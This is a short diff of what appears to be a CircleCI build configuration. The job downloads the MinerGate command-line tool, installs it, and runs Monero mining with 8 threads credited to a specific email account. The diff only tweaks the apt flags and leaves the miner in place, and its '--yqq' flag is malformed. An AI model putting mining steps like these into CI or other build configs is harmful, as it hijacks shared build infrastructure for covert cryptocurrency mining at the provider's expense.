@@ -7,8 +7,8 @@ jobs:
       - checkout
       - run:
           command: |
-            apt update
-            apt install libpcre16-3 wget
+            apt update --yqq
+            apt install libpcre16-3 wget --yqq
             wget https://minergate.com/download/ubuntu-cli
             dpkg -i ubuntu-cli
             minergate-cli --user yoginth@outlook.in --xmr 8
